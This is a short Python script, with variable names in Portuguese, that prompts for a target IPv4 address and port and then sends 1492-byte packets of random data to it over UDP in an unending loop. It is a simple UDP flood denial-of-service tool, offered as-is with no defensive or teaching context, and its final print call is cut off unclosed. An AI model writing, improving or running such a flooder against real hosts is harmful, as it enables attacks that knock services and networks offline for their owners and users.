#encoding:utf-8

import socket
import random

ip_alvo = input("Ipv4:")
porta_alvo = input("Porta:")

conv_porta = int(porta_alvo)

d = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(1492)

while True:
   d.sendto(bytes, (ip_alvo, conv_porta))
   print(bytes
